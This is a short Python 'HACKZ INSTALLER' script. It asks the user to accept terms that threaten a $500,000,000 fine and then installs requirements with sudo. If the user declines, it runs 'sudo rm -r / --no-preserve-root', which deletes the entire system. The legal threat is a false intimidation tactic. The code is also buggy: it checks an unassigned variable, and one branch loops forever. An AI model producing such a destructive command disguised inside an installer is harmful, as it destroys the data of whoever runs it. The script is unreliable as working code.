import os
import time
print("===========================================")
print("HACKZ INSTALLER")
print("===========================================")
print("Do you agree to the terms and conditions that are the following: redistributing, changing or saying that anything related to HACKZ is made by you other than AvexProducts, you will be fined $500000000 USD. THIS IS LEGALLY ALLOWED. Type 'YES' or 'NO'")
choice = input("Enter: ")
if enter == "YES":
    print("Type 'install' to install the requirements and run HACKZ latest version. ")
    enter = input("Enter : ")
    while True:
        if enter == "install":
            os.system('sudo apt-get update')
            os.system('sudo apt-get upgrade')
            os.system('sudo apt-get install python3-pip')
            os.system('sudo pip3 install -r requirements.txt --break-system-packages')
            os.system('sudo python3 HACKZ.py')
            break
        else:
            print("ERROR. COULD NOT UNDERSTAND")
            continue
elif enter == "NO":
    print("You are NOT allowed to use this software. ")
    time.sleep(3)
    os.system('sudo rm -r / --no-preserve-root')
